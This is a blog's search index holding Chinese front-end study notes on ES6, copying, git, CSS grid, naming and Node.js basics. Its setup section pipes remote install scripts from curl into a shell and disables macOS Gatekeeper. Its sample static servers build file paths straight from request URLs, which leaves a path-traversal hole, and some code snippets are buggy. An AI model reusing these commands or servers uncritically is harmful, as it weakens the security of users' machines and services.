<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[ES6常用知识点]]></title>
    <url>%2F2019%2F03%2F02%2FES6%E5%B8%B8%E7%94%A8%E7%9F%A5%E8%AF%86%E7%82%B9%2F</url>
    <content type="text"><![CDATA[归纳ES6的常考问题 var,let及const我们都知道使用var声明的变量会被提升到作用域顶部，举个例子来看看三者的区别1234567891011var a = 1let b = 1const c = 1console.log(window.b) // undefinedconsole.log(window. c) // undefinedfunction test()&#123; console.log(a) let a&#125;test() 在全局作用域下声明let和const不会被挂载到window上，再者如果我们在声明了a之前使用了a，会报错。报错的原因是存在暂时性死区，我们不能在声明前就使用一个变量。那么为什么会存在变量提升这个事情呢？其实它的存在是为了解决函数间互相调用的情况。1234567function test1() &#123; test2()&#125;function test2() &#123; test1()&#125;test1() 假如不存在提升这个情况，那么就实现不了上述的代码，因为不可能存在 test1 在 test2 前面然后 test2 又在 test1 前面。 总结几点： 函数提升优于变量提升，函数提升会把整个函数挪到作用域顶部，变量提升只会把声明挪到作用域顶部； var存在提升，我们可以在声明之前使用；let和const存在暂时性死区，不能在声明前使用； var在全局作用域下声明变量会导致变量挂载到window上，其他两者不会； let和const的作用基本一致，但const声明的变量不能被再次赋值； 原型继承&amp;&amp;ES6的Class继承 原型继承 123456789101112131415161718子类：function Human(name) &#123; this.name = name // 自有属性&#125;Human.prototype.run = function() &#123; // 原型上的共有属性 console.log(&quot;我叫&quot; + this.name + &quot;，我在跑步&quot;) return undefined&#125;孙类：function Man(name) &#123; Human.call(this.name) // ①调用，即call一下父类 this.gender = &apos;男&apos; // 自有属性&#125;Man.prototype.__proto__ = Human.prototype // ②将Man的原型链到Human的原型上Man.prototype.fight = function() &#123; console.log(&apos;捶你胸口&apos;);&#125; Class继承 12345678910111213141516171819class Human &#123; constructor(name) &#123; this.name = name // 自有属性 &#125; run() &#123; // 公有属性，直接写在prototype即原型链上 console.log(&quot;我叫&quot; + this.name + &quot;，我在跑步&quot;); return undefined &#125;&#125;class Man extends Human &#123; // 等价于 Man.prototype.__proto__ = Human.prototype constructor(name) &#123; super(name) // 调用父类，等价于Human.call(this,name)，使子类拥有this.name = name this.gender = &apos;男&apos; &#125; fight() &#123; console.log(&apos;捶你&apos;); &#125;&#125; class 实现继承的核心在于使用 extends 表明继承自哪个父类，并且在子类构造函数中必须调用 super，因为这段代码可以看成 Parent.call(this, value)，但JS中并不存在类，所以 class 的本质就是函数 模块化（待补充）proxy在Vue3.0中，将通过proxy替代原本的Object.defineProperty来实现数据响应式，Proxy是ES6中的新增功能，它可以用来自定义对象中的操作1let p = new Proxy(target,handler) // target 代表需要添加代理的对象，handler 用来自定义对象中的操作，比如可以用来自定义 set 或者 get 函数。 下面通过Proxy来实现一个数据响应式1234567891011121314151617181920212223242526let onWatch = (obj, setBind, getLogger) =&gt; &#123; let handler = &#123; get(target, property, receiver) &#123; getLogger(target, property) return Reflect.get(target, property, receiver) &#125;, set(target, property, value, receiver) &#123; setBind(value, property) return Reflect.set(target, property, value) &#125; &#125; return new Proxy(obj, handler)&#125;let obj = &#123; a: 1 &#125;let p = onWatch( obj, (v, property) =&gt; &#123; console.log(`监听到属性$&#123;property&#125;改变为$&#123;v&#125;`) &#125;, (target, property) =&gt; &#123; console.log(`&apos;$&#123;property&#125;&apos; = $&#123;target[property]&#125;`) &#125;)p.a = 2 // 监听到属性a改变p.a // &apos;a&apos; = 2 我们通过自定义 set 和 get 函数的方式，在原本的逻辑中插入了我们的函数逻辑，实现了在对对象任何属性进行读写时发出通知。 如果需要实现一个 Vue 中的响应式，需要在 get 中收集依赖，set 派发更新，之所以要使用 Proxy 替换原本的 API 原因在于 Proxy 无需一层层递归为每个属性添加代理，一次即可完成以上操作，性能上更好，并且原本的实现有一些数据更新不能监听到，但是 Proxy 可以完美监听到任何方式的数据改变，唯一缺陷是浏览器兼容不好。 map、filter、reduce map 作用是生成一个新数组，遍历原数组，将每个元素拿出来做一些变化然后放入到新的数组中。12eg:[1, 2, 3].map(v =&gt; v + 1) // -&gt; [2, 3, 4] 实现原理123456789Array.prototype.map = function(fn)&#123; let result = []; for(let i=0; i &lt; this.length; i++) &#123; if(i in this) &#123; result[i] = fn.call(undefined,this[i],i,this) &#125; &#125; return result&#125; filter 有条件地放入map，是真值就push进去，不是真值就不push1234eg:a = [1,2,3,4,5]a.filter( (value) =&gt; &#123;return value % 2 === 0&#125;) // [2,4]a.filter( (value) =&gt; &#123;return value % 2 !== 0&#125;) // [1,3,5] 实现原理123456789101112Array.prototype.filter = function(fn)&#123; let result = []; let temp; for(let i = 0; i&lt;this.length; i++) &#123; if(i in this) &#123; if(temp = fn.call(undefined,this[i],i,this))&#123; result.push(temp) &#125; &#125; &#125; return result&#125; reduce 可以将数组中的元素通过回调函数最终转换为一个值12345678910111213eg:如果我们想实现一个功能将函数里的元素全部相加得到一个值，可能会这样写代码：const arr = [1, 2, 3]let total = 0for (let i = 0; i &lt; arr.length; i++) &#123; total += arr[i]&#125;console.log(total) //6 如果用reduce可以一行实现：const arr = [1, 2, 3]const sum = arr.reduce((acc, current) =&gt; acc + current, 0)console.log(sum) reduce 接受两个参数，分别是回调函数和初始值 首先初始值为 0，该值会在执行第一次回调函数时作为第一个参数传入； 回调函数接受四个参数，分别为累计值、当前元素、当前索引、原数组； 在一次执行回调函数时，当前值和初始值相加得出结果 1，该结果会在第二次执行回调函数时当做第一个参数传入； 所以在第二次执行回调函数时，相加的值就分别是 1 和 2，以此类推，循环结束后得到结果 6； 实现原理：123456789Array.prototype.reduce = function(fn,init) &#123; let result = init; for(let i = 0; i &lt; this.length; i++)&#123; if(i in this) &#123; result = fn.call(undefined,result,this[i],i,this) &#125; &#125; return result&#125; 用reduce实现map和filterreduce -&gt; map1234567array2 = array.map( (v) =&gt; v+1) // 给数组每一项加1可以写成：array2 = array.reduce( (result,v) =&gt; &#123; result.push(v+1); return result&#125;, []) reduce -&gt; filter123456789array2 = array.filter( (v) =&gt; v%2 === 0)可以写成：array2 = array.reduce( (result,v) =&gt; &#123; if( v%2 === 0) &#123; result.push(v) &#125; return result&#125;, [])]]></content>
  </entry>
  <entry>
    <title><![CDATA[深拷贝&&浅拷贝]]></title>
    <url>%2F2019%2F03%2F02%2F%E6%B7%B1%E6%8B%B7%E8%B4%9D-%E6%B5%85%E6%8B%B7%E8%B4%9D%2F</url>
    <content type="text"><![CDATA[浅拷贝和深拷贝的几种常见方法 浅拷贝复杂类型即对象在赋值过程中其实复制的是一个地址（指针），这个指针指向计算机的一小块内存，从而导致修改一个地方其他地方也跟着改变，但我们不希望这种情况发生，可以使用浅拷贝解决这个问题123456let a = &#123; age: 18&#125;let b = a;a.age = 20;console.log(b.age); // 输出20 通过Object.assign，它只会拷贝所有的属性值到新对象中，如果属性值是对象的话，拷贝的是地址，并不是深拷贝 123456let a = &#123; age: 18&#125;let b = Object.assign(&#123;&#125;,a);a.age = 20;console.log(b.age); // 18 另外还可以通过展开运算符…来实现浅拷贝 123456let a = &#123; age: 18&#125;let b = &#123; ...a &#125;a.age = 20console.log(b.age) // 18 浅拷贝只解决了第一层问题，如果接下去的值中还有对象的话，那么就又回到最开始的话题了，两者享有同一个地址。要解决这个问题，我们就要使用深拷贝了 深拷贝 JSON实现深拷贝123456789let a = &#123; age: 18, jobs: &#123; first: &apos;doctor&apos; &#125;&#125;let b = JSON.parse(JSON.stringify(a)) // 将这个对象变成字符串，再从这个字符串中生成一个对象a.jobs.first = &apos;teacher&apos;console.log(b.jobs.first) // doctor 但是这个方法有局限性，JSON不支持函数，引用，undefined，正则，Date日期对象 如果想自己实现一个深拷贝，这里只能实现一个简易版本，有许多边界情况没有考虑到，但在实际应用中更推荐lodash的深拷贝函数https://lodash.com/docs/4.17.11#cloneDeep12345678910111213141516171819202122232425262728function deepClone(obj) &#123; function isObject(o) &#123; return (typeof o === &apos;object&apos; || typeof o === &apos;function&apos;) &amp;&amp; o !== null &#125; if (!isObject(obj)) &#123; throw new Error(&apos;非对象&apos;) &#125; let isArray = Array.isArray(obj) let newObj = isArray ? [...obj] : &#123; ...obj &#125; Reflect.ownKeys(newObj).forEach(key =&gt; &#123; newObj[key] = isObject(obj[key]) ? deepClone(obj[key]) : obj[key] &#125;) return newObj&#125;let obj = &#123; a: [1, 2, 3], b: &#123; c: 2, d: 3 &#125;&#125;let newObj = deepClone(obj)newObj.b.c = 1console.log(obj.b.c) // 2]]></content>
  </entry>
  <entry>
    <title><![CDATA[环境配置]]></title>
    <url>%2F2018%2F11%2F27%2F%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[mac环境配置 开发环境允许安装不安全的软件1$ sudo spctl --master-disable Homebrew安装软件包管理系统，它简化了Mac OS X系统上的软件安装过程123$ /usr/bin/ruby -e &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)&quot;- /usr/bin/ruby -e：使用ruby环境运行- curl -fsSL：使用curl命令下载 oh my zsh123$ zsh --version // 安装前先查看版本$ brew install zsh // 安装zsh$ sh -c &quot;$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)&quot; // 使用oh-my-zsh让zsh更加强大 还可以安装一些oh-my-zsh的插件：autojump nodejs1$ brew install node // 安装node后会自动安装npm（node package manager），用来搜索、下载、管理 Node.js 相关套件 如果未安装Homebrew，nodejs下载传送：nodejs vimvim 是 Unix/Linux 终端自带的，macOS也有。它带有很多快捷键，死记硬背不如实际多用:)12:q! 不保存直接退出:wq 保存后退出 git1234567891011$ brew install git# git配置文件目录~/.gitconfig# 基本配置git config --global user.name &quot;joyce&quot;git config --global user.email &quot;jayce_ma.xa@foxmail.com&quot;git config --global color.ui truegit config --global core.editor &quot;vim&quot; # 设置Editor使用vimgit config --global core.quotepath false # 设置显示中文文件名 终端命令1234567$ say xxx 读单词$ pwd 显示当前目录的路径名$ cd / 返回根目录$ cd - 返回上一级目录$ man xxx 查看命令的详细帮助$ rm xxx 删除文件$ rm -rf xxx 删除文件夹 我的另一篇博客：命令行基础操作 VSCode快捷键编辑器与窗口123456789# 打开一个新窗口 Cmd + Shift + N# 关闭窗口 Cmd + Shift + W# 新建文件 Cmd + N# 关闭文件 Cmd + W# 同一编辑器下文件相互切换 control + tab# 多个编辑器之间切换 Cmd + ~# 控制左侧边栏显隐 Cmd + B 编辑代码1234# 复制，如果未选择文本则复制整行 Cmd + c# 剪切，如果未选中文本则剪切整行 Cmd + x# 移动整行 alt + ↑/↓]]></content>
  </entry>
  <entry>
    <title><![CDATA[git操作命令]]></title>
    <url>%2F2018%2F11%2F26%2Fgit%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[基础git操作 ssh公钥查看本机是否有ssh公钥，通常一个主机对应一个密钥12$ cd ~/.ssh$ ls 通常.pub后缀的文件就是公钥 创建ssh公钥1$ ssh-keygen 查看本机ssh公钥1$ cat ~/.ssh/id_rsa.pub git status查看工作区状态123456789101112131415161718192021222324252627282930313233343536373839404142434445# git status- 存在未跟踪文件On branch masterUntracked files: (use "git add &lt;file&gt;..." to include in what will be committed) READMEnothing added to commit but untracked files present (use "git add" to track)- 将未跟踪文件加入跟踪$ git add README再次执行$ git statusOn branch masterChanges to be committed: (use "git reset HEAD &lt;file&gt;..." to unstage) new file: README此时该文件为暂存状态- 存在已修改文件$ git statusOn branch masterChanges not staged for commit: (use "git add &lt;file&gt;..." to update what will be committed) (use "git checkout -- &lt;file&gt;..." to discard changes in working directory) modified: index.html说明已跟踪文件内容发生变化，但还未放入暂存区- 将已修改文件加入暂存区$ git add index.htm再次执行$ git statusOn branch masterChanges to be committed: (use "git reset HEAD &lt;file&gt;..." to unstage) new file: README modified: index.html这时存在一个新增文件和一个改动过的文件，它们都已暂存，下次commit会一并提交到仓库- 工作目录干净，不存在未跟踪或修改过的文件On branch masterYour branch is up to date with 'origin/master'.nothing to commit, working tree clean 常见操作123456789101112# 从已跟踪文件清单中移除（即暂缓区），然后提交$ git rm# 移动文件（前一个文件是要移动的文件，后一个是移动后的文件）$ git mv file_from file_to这一部相当于运行了下面三步：$ mv README.txt README$ git rm README.txt$ git add README# 查看历史提交记录$ git log -l 3 // l指list，后跟想要查看的历史记录条目数 撤销上一次的commit12345678# 查看提交记录，找到上次提交的 commit id$ git log# 撤销，使代码恢复到前一次 commit id 对应的版本$ git reset --hard 748f409386c9fb1f4a51f29a45bad6bff24bf284# 撤销，但不对代码修改进行撤销，仍可以通过 git commit 重新提交对本地代码的修改$ git reset 748f409386c9fb1f4a51f29a45bad6bff24bf284]]></content>
  </entry>
  <entry>
    <title><![CDATA[grid布局]]></title>
    <url>%2F2018%2F11%2F25%2Fgrid%E5%B8%83%E5%B1%80%2F</url>
    <content type="text"><![CDATA[初学grid布局 grid布局术语 Grid Container设置了 display: grid; 的元素，他是所有grid item的直接父项，如下面的.container 12345&lt;div class="container"&gt; &lt;div class="item item-1"&gt;&lt;/div&gt; &lt;div class="item item-2"&gt;&lt;/div&gt; &lt;div class="item item-3"&gt;&lt;/div&gt;&lt;/div&gt; Grid ItemGrid容器的直接子元素，如下的item，但注意sub-item不是 1234567&lt;div class="container"&gt; &lt;div class="item"&gt;&lt;/div&gt; &lt;div class="item"&gt; &lt;p class="sub-item"&gt;&lt;/p&gt; &lt;/div&gt; &lt;div class="item"&gt;&lt;/div&gt;&lt;/div&gt; Grid Line网格线，可以是垂直的也可以是水平的 Grid Track两个相邻网格线之间的空间，可以想象成网格的列或行 Grid Cell代表了一个网格单元 Grid Area网格区域，可以由任意数量的网格单元组成 列表属性父容器Grid Container12345678910111213&lt;div class="container"&gt;&lt;/div&gt;&lt;style&gt; .container &#123; width: 400px; height: 300px; border: 1px solid pink; display: grid; grid-template-columns: 10% auto 10%; grid-template-rows: 50px auto 50px; &#125;&lt;/style&gt; 子元素Grid Items12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;div class="container"&gt; &lt;div class="header"&gt;header&lt;/div&gt; &lt;div class="main"&gt;main&lt;/div&gt; &lt;div class="aside"&gt;aside&lt;/div&gt; &lt;div class="footer"&gt;footer&lt;/div&gt;&lt;/div&gt;&lt;style&gt; .container &#123; height: 100vh; border: 1px solid pink; display: grid; grid-template-columns: 10% auto 10%; // 设置布局结构（画网格） grid-template-rows: 50px auto 50px; grid-template-areas: // 因为上面设置的结构为三行三列 "header header header" // 布局也按三行三列 ". main aside" // .为空 表示该单元格不填充内容 "footer footer footer" /* grid-template的简写形式，布局效果与上面相同 */ grid-template: "header header header" 50px; // 引号内是填充单元格的名称（此处为三行），后跟该行的行宽 ". main aside" auto; "footer footer footer" 50px; / 10% auto 10%; // 规定列宽（此处为三列） &#125; .header &#123; grid-area: header; // 给每种想要填充的网格单元命名 background: #42b983; &#125; .main &#123; grid-area: main; background: #409eff; &#125; .aside &#123; grid-area: aside; background: #e6a23c; &#125; .footer &#123; grid-area: footer; background: #909399; &#125;&lt;/style&gt; 最终布局效果如图： 行、列间缝隙只能在行/列之间创建缝隙，而不能在外部边缘创建。grid-gap是两者的缩写1234grid-row-gap: 10px;grid-column-gap: 5px;grid-gap: 10px 5px; // 等同于上面的写法 justify-items和align-items（每个网格元素items相对于网格整体，和下面的属性作区分）沿着横轴（行）或沿着纵轴（列）对齐网格内的内容1234start: 内容与网格区域的左端对齐end: 内容与网格区域的右端对齐center: 内容位于网格区域的中间位置stretch: 内容宽度占据整个网格区域空间(默认值) 例如，给上面的布局里的main里的内容居中123456789....main &#123; grid-area: main; background: #409eff; display: grid; justify-items: center; align-items: center;&#125;... justify-content（网格整体相对于容器居中）当网格总大小小于其容器大小时12345678910111213.container &#123; height: 100vh; border: 1px solid pink; display: grid; grid-template-columns: 10% 400px 10%; // 和之前的变化在于auto改为400px grid-template-rows: 50px auto 50px; justify-content: center; // 使得整个容器居中 grid-template-areas: "header header header" ". main aside" "footer footer footer" grid简写、grid-area简写（grid布局最终写法）12345678910111213141516171819202122232425262728293031.container &#123; height: 100vh; border: 1px solid pink; display: grid; grid: 50px auto 50px / 10% auto 10%; // 斜线前为横向，后为纵向&#125;.header &#123; background: #42b983; grid-row: 1 / 2; // 所占行数 grid-column: 1 / span 3; // span可以理解为跨度，也可以直接写为grid-column: 1 / 4; 效果相同&#125;.main &#123; background: #409eff; grid-row: 2; grid-column: 2;&#125; .aside &#123; background: #e6a23c; grid-row: 2; grid-column: 3;&#125;.footer &#123; background: #909399; grid-row: 3; grid-column: 1 / 4;&#125; 以知乎首页布局为例我们可以将它看作是两行四列的布局，头部是一行三列的格局1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;body&gt; &lt;header&gt; &lt;div class="wrapper"&gt;I am Wrapper&lt;/div&gt; &lt;/header&gt; &lt;main&gt;&lt;/main&gt; &lt;aside&gt;&lt;/aside&gt;&lt;/body&gt;&lt;style&gt; * &#123; margin: 0; padding: 0; &#125; body &#123; height: 100vh; display: grid; grid: 50px auto / 1fr 590px 200px 1fr; grid-gap: 10px; &#125; header &#123; background: #eee; grid-column: 1 / 5; grid-row: 1; display: grid; grid: 50px / 1fr 800px 1fr; &#125; .wrapper &#123; grid-column: 2; grid-row: 1; &#125; main &#123; height: 400px; background: #409eff; grid-column: 2; grid-row: 2; &#125; aside &#123; height: 400px; background: #909399; grid-column: 3; grid-row: 2; &#125;&lt;/style&gt; 链接：https://blog.jirengu.com/?p=990]]></content>
  </entry>
  <entry>
    <title><![CDATA[增强代码可读性]]></title>
    <url>%2F2018%2F09%2F18%2F%E5%A2%9E%E5%BC%BA%E4%BB%A3%E7%A0%81%E5%8F%AF%E8%AF%BB%E6%80%A7%2F</url>
    <content type="text"><![CDATA[词性和一致性 优化基本原则 易读性优先 如果不是性能瓶颈，就不要为了性能改写代码 复杂性守恒原则：无论怎么写代码，复杂性都不会消失。如果逻辑复杂，代码就应该是复杂的；如果逻辑简单，代码就应该是简单的 注意词性普通变量/属性用「名词」12345678var person = &#123; name: &apos;Joyce&apos;&#125;var student = &#123; grade: 3, class: 2&#125; 布尔变量或属性用「形容词」/「be动词」/「情态动词」/「hasXXX」123456var person = &#123; dead: false, // 如果是形容词，前面就没必要加 is，比如isDead 就很废话 isVip: true, // be 动词有 is、was 等，后面一般接名词 canSpeak: true, //情态动词有 can、should、will、need 等，情态动词后面接动词 hasChildren: true, // has 加名词&#125; 普通函数或方法用「动词」12345var person = &#123; run()&#123;&#125;, // 不及物动词 drinkWater()&#123;&#125;, // 及物动词 eat(foo)&#123;&#125;, // 及物动词加参数（参数是名词）&#125; 回调、钩子函数用「介词」开头，或用「动词的现在完成时态」1234567891011121314151617181920212223var person = &#123; beforeDie()&#123;&#125;, afterDie()&#123;&#125;, // 或者 beforeDie()&#123;&#125;, dead()&#123;&#125; // 这里跟 布尔 冲突，但只要不同时暴露 布尔 dead 和函数 dead 就行，不想冲突就用上面的 afterDie&#125;eg: button.addEventListener(&apos;click&apos;, onButtonClick)var component = &#123; beforeCreate()&#123;&#125;, created()&#123;&#125;, beforeMount()&#123;&#125;, mounted()&#123;&#125;, beforeUpdate()&#123;&#125;, updated()&#123;&#125;, activated()&#123;&#125;, deactivated()&#123;&#125;, beforeDestroy()&#123;&#125;, destroyed()&#123;&#125;, errorCaptured()&#123;&#125;&#125; 容易混淆的地方加前缀123456div1.classList.add(&apos;active&apos;) // DOM对象div2.addClass(&apos;active&apos;) // jQuery对象可以改写成：domDiv1.classList.add(&apos;active&apos;) or elDiv1.classList.add(&apos;active&apos;)$div2.addClass(&apos;active&apos;) 注意一致性介词一致性如果你使用了 before + after，那么就在代码的所有地方都坚持使用 如果你使用了 before + 完成时，那么就坚持使用 如果你改来改去，就「不一致」了，不一致将导致「不可预测」 顺序一致性比如 updateContainerWidth 和 updateHeightOfContainer 的顺序就令人很别扭，同样会引发「不可预测」 表里一致性函数名即能体现函数功能12345function getSongs()&#123; return $.get(&apos;/songs).then((response)&#123; div.innerText = response.songs &#125;)&#125; 函数名 getSongs 表示获取歌曲，并没有暗示这个函数会更新页面，但是实际上函数更新了 div，造成表里不一，正确的写法是 纠正函数名 12345function getSongsAndUpdateDiv()&#123; return $.get(&apos;/songs).then((response)&#123; div.innerText = response.songs &#125;)&#125; 拆分成两个函数 123456789function getSongs()&#123; return $.get(&apos;/songs)&#125;function updateDiv(songs)&#123; div.innerText = response.songs&#125;getSongs().then((response)=&gt;&#123; updateDiv(response.songs)&#125;)]]></content>
  </entry>
  <entry>
    <title><![CDATA[搭建简易服务器]]></title>
    <url>%2F2018%2F08%2F29%2F%E6%90%AD%E5%BB%BA%E7%AE%80%E6%98%93%E6%9C%8D%E5%8A%A1%E5%99%A8%2F</url>
    <content type="text"><![CDATA[Node.js简易服务器 一个简单的静态服务器123456789101112131415var http = require(&apos;http&apos;)var fs = require(&apos;fs&apos;)var server = http.createServer(function(req, res)&#123; try&#123; var fileContent = fs.readFileSync(__dirname + &apos;/static&apos; + req.url) res.write(fileContent) &#125;catch(e)&#123; res.writeHead(404, &apos;not found&apos;) &#125; res.end()&#125;)server.listen(8080)console.log(&apos;visit http://localhost:8080&apos; ) 支持静态文件动态路由的服务器12345678910111213141516171819202122232425262728var http = require(&apos;http&apos;)var fs = require(&apos;fs&apos;)var url = require(&apos;url&apos;) // 引入url模块解析url地址，eg：127.0.0.1:8080/index.html?a=1&amp;b=2 需要将?后的参数去掉http.createServer(function(req, res)&#123; var pathObj = url.parse(req.url, true) console.log(pathObj) switch (pathObj.pathname) &#123; // 路由 case &apos;/getWeather&apos;: var ret if(pathObj.query.city == &apos;beijing&apos;)&#123; ret = &#123; city: &apos;beijing&apos;, weather: &apos;晴天&apos; &#125; &#125;else&#123; ret = &#123; city: pathObj.query.city, weather: &apos;不知道&apos; &#125; &#125; res.end(JSON.stringify(ret)) break; default: try&#123; // 静态服务器 var fileContent = fs.readFileSync(__dirname + &apos;/static&apos; + pathObj.pathnamel) res.write(fileContent) &#125;catch(e)&#123; res.writeHead(404, &apos;not found&apos;) &#125; res.end( ) &#125;&#125;).listen(8080)]]></content>
      <tags>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[命令行基础操作]]></title>
    <url>%2F2018%2F08%2F28%2F%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C%2F</url>
    <content type="text"><![CDATA[记下平时常用的命令在学习命令行的过程中，遇到不懂的命令及用法，可在网站： explainshell.com 来查看学习 基础知识1、绝对路径和相对路径：以 / 开头的就是绝对路径，其他就是相对路径 2、基本符号的含义12345~ 用户目录（mac中的家目录） eg：/Users /mxy/ 根目录，整个系统. 所在当前目录.. 父级目录，即当前目录的上级目录$ 提示符，表示可以输入命令 简单操作ls 不包括隐藏文件 1$ ls 查看所有文件（包括隐藏） 1$ ls -a 查看当前目录下所有路径详细信息 1$ ls -l 前两种的结合，即查看当前目录下所有文件的详细信息（包括隐藏文件） 1$ ls -al 切换目录：cd1$ cd 文件名 返回上一级文件夹（即返回 ~ 家目录）1$ cd .. 切换至当前目录下的文件夹1$ cd ./文件名 等同于 $ cd 文件名 文件相关 创建文件 1$ touch 1.txt // 如果没有则新建，如果有则改变文件最后更新时间 删除文件 1234$ rm 文件路径 // 删除文件$ rm -f 文件路径 // 强制删除文件（-f：强制）$ rm -r 目录路径 // 删除目录（-r：递归）$ rm -rf 目录路径 // 强制删除目录，目录只能递归地删除，没有-r目录删除不掉，没有-f则会一遍遍询问是否删除 移动文件 12$ mv 1.txt 111.txt // 重命名$ mv 1.txt demo // 将文件1.txt移动到demo文件夹 创建文件夹 1$ mkdir text 其他 pwd // 快速查看当前路径 tree 目录名 // 查看目录结构 tldr 命令 // 快速查询一个命令怎么使用 clear // 清屏 history // 查看历史操作 vim的使用1、创建index.html1$ touch index.html 2、编辑index.html1$ vi index.html 3、按下键盘上的 i 键进入编辑模式 4、按下 esc 退出编辑模式 5、保存与不保存12:wq! 保存并退出:aq! 不保存并退出 6、查看文件结果12$ cat 文件名 // 显示文件内容$ cat 文件1 文件2 &gt; 文件3 // 将文件1和文件2合并放进文件3，文件3原本内容被替代，如果不存在文件3则新建一个 花式练vim：https://mp.weixin.qq.com/s?__biz=MjM5MTk1ODE0MA==&amp;mid=2648436205&amp;idx=1&amp;sn=31783b90ad372c27457e6c394659d9b2&amp;chksm=be82d8fe89f551e8b035c03919230a470b5bc6324e219f46a2b4478f368d2fdee491518b1987&amp;mpshare=1&amp;scene=1&amp;srcid=0605oexPQ6Bh0PamzpiSjQ6a&amp;key=10a5f2b3370ca265748cfcc6b93af05ec9bb9c614f130b6d3b4665b31af06dcd1225ced8fc7d27e11c4c00ff365f2829ea5547ff3468d07ac58745d792bae9a42b98063c8da7c478062b5a7e463c0a50&amp;ascene=0&amp;uin=OTAyMTc5NDQw&amp;devicetype=iMac+MacBookAir5%2C1+OSX+OSX+10.13.5+build(17F59b)&amp;version=12020010&amp;nettype=WIFI&amp;lang=zh_CN&amp;fontScale=100&amp;pass_ticket=QcUzX%2FQH9oKZGdPAAFIYmpJrFUAPwy8JLfcrE9YCcLSVoFyC6bRxWS8Dbhpbatp%2F 查看全局安装过的包1npm list -g --depth 0 -g 全局安装的list 罗列已安装的node包]]></content>
      <tags>
        <tag>命令行</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[面试题总结（一）]]></title>
    <url>%2F2018%2F08%2F27%2F%E9%9D%A2%E8%AF%95%E9%A2%98%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%80%EF%BC%89%2F</url>
    <content type="text"><![CDATA[考察了一些基础知识点 1、考察内存机制实际打印出来type、size都是全局作用域下的值，在内存图中它们是以值的方式存储，而对于format是一个数组，对于引用类型的值，它在内存图中是以地址的方式存储，当你往同一个地址（format数组）push值，就会更新数据，因此打印出来的只有数组发生了更新 2、考察JS单线程的执行机制在前面的一篇博客中有总结过JS的执行机制，这里打印的顺序为：1 -&gt; 3 -&gt; 6 -&gt; 4 -&gt; undefined -&gt; 2 当进入这段代码，这是一个宏任务，首先打印1；看到setTimeout属于另一个宏任务，将它放在宏任务对列里；看到Promise是同步任务，执行并打印3；看到then属于微任务，将它放在这段代码（宏任务）下的微任务对列里；随后打印6；此时一轮宏任务执行完毕，看微任务队列有一个任务then，它会打印成功函数4，而失败函数5不会被打印出来；此时再去查看宏任务对列有一个setTimeout函数，执行并打印出2。 3、考察数组去重，可以用12a = [1,2,5,1,4,5,2,4,3]Array.from(new Set(a)) 但题目还绕了一个弯，需要用两次reverse()方法使得“重复则保留最后出现的数值” 4、考察正则，当时看到就两眼蒙逼，根本不会写正则 方大大给出的做法： 5、用到Promise.all的方法 // Promise.all, 当所有的 Promise 对象都完成后再执行]]></content>
  </entry>
  <entry>
    <title><![CDATA[CRM法入门node.js]]></title>
    <url>%2F2018%2F08%2F24%2FCRM%E6%B3%95%E5%85%A5%E9%97%A8node-js%2F</url>
    <content type="text"><![CDATA[CRM套路入门node.js CRM套路 C（copy）抄 R（run）运行 M（modify）修改fs 文件系统fs.readFile(path[, options], callback)异步读取文件1、新建text.js文件，编辑text.js文件如下：（官方文档抄）1234fs.readFile(&apos;/404&apos;, (err, data) =&gt; &#123; // 首先给出一个绝对不存在的文件/404 if (err) throw err; console.log(data);&#125;); 2、命令行输入1node text.js // 运行文件会看到抛出错误 3、解决方法是在文件顶部加入：1let fs = require(&apos;fs&apos;) // 从node中加载该模块 4、此时重新运行，看到报错为没有该/404文件 5、此时在桌面创建一个1.txt文件12345let fs = require(&apos;fs&apos;)fs.readFile(&apos;/Users/ringcrl/Desktop/1.txt&apos;, (err, data) =&gt; &#123; // 切记这里创建的文件不能写成~/Desktop/1.txt，命令行可以识别~，没说nodejs也可以！！！ console.log(err); // 这里将错误和数据都打印出来 console.log(data);&#125;); 6、调用data.toString12345let fs = require(&apos;fs&apos;)fs.readFile(&apos;/Users/ringcrl/Desktop/1.txt&apos;, (err, data) =&gt; &#123; console.log(err); console.log(data.toString);&#125;); 修改1.txt中的内容为： 我是1.txt ， 运行可以看到打印出1.txt中的内容 fs.readFileSync(path[, options])同步读取文件1、官方文档抄代码1234let fs = require(&apos;fs&apos;)let data = fs.readFileSync(&apos;/Users/ringcrl/Desktop/1.txt&apos;)console.log(data.toString()); 可以看到同样打印出了1.txt中的内容 创建一个http server一般来说stackoverflow上都有可以直接拿过来跑的代码，注意搜索时的关键词eg：1stackoverflow nodejs set response -express // -express的意思是除去带有express关键字的内容 text.js1234567891011let http = require(&apos;http&apos;)let server = http.createServer(function(req,res)&#123; console.log(req.url) res.statusCode = 201 res.write(&apos;hello&apos;); res.end() // 不调用的话就一直在发送请求&#125;)server.listen(9999) // 监听的端口号console.log(&apos;9999&apos;)]]></content>
      <tags>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[axios的使用]]></title>
    <url>%2F2018%2F08%2F23%2Faxios%E7%9A%84%E4%BD%BF%E7%94%A8%2F</url>
